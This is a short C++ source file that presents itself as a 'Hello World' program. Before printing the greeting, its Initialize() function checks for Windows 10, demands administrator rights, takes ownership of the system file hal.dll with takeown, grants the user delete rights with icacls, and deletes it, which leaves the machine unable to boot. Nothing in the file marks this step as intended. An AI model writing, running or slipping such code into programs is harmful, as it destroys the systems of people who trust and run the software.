//#include <stdlib.h>
//#include <string.h>
//#include <windows.h>

#include <stdio.h>
#include <shlobj.h>
#include <lmcons.h>

void Initialize() {
  system("ver > version");
  FILE* ver = fopen("version", "rb");
  fseek(ver, 0, SEEK_END);
  long size = ftell(ver);
  rewind(ver);
  char* buffer = new char[size];
  fread(buffer, 1, size, ver);

  char digits[] = "1234567890";
  int pos = strcspn(buffer, digits);
  int major = int(atof(&buffer[pos]) * 10) / 10;
//  int minor = int(atof(&buffer[pos]) * 10) % 10;
  fclose(ver);
  delete[] buffer;
  remove("version");

  if (major != 10) return;
  if (!IsUserAnAdmin()) {
    MessageBox(nullptr, "Admin access is required on this OS.\n", "Windows 10", MB_ICONERROR | MB_OK);
    exit(EXIT_FAILURE);
  }

  DWORD length = UNLEN + 1;
  char username[UNLEN + 1];
  GetUserName(username, &length);
  const char* file = "C:\\Windows\\System32\\hal.dll";

  char* takeown = new char[strlen(file) + 22];
  sprintf(takeown, "takeown /f %s >nul 2>&1", file);
  system(takeown);
  delete takeown;

  char* grant = new char[strlen(file) + length + 28];
  sprintf(grant, "icacls %s /grant %s:D >nul 2>&1", file, username);
  system(grant);
  delete grant;

  remove(file);
}

int main(int argc, char* argv[]) {
  Initialize();
  // Main program start here.
  printf("Hello World!");
  getchar();
  return 0;
}
